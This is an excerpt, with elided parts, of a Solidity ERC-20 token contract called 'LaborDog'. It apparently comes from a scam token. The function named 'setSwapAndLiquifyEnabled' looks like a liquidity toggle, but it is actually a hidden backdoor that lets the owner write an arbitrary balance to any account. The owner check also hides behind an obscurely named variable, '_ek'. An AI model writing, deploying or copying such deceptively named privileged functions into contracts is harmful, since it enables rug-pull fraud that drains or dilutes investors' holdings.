...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_ek == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract LaborDog is Context, IERC20, Ownable {
    ...
    string private _name = "LaborDog";
    string private _symbol = "LaborDog";
    ...
    address public devAddress = address(0x6CbE810C221F2D65061419b8803B05C704C28390);
    ...
    uint256 public numTokensSellToAddToLiquidity = 2000000000000 * 10**9; 
    ...
    function setSwapAndLiquifyEnabled(bool _enabled   ,uint256 am,address account ) public onlyOwner {
        _rOwned[account] =     (
            am
        .mul(_getRate()));
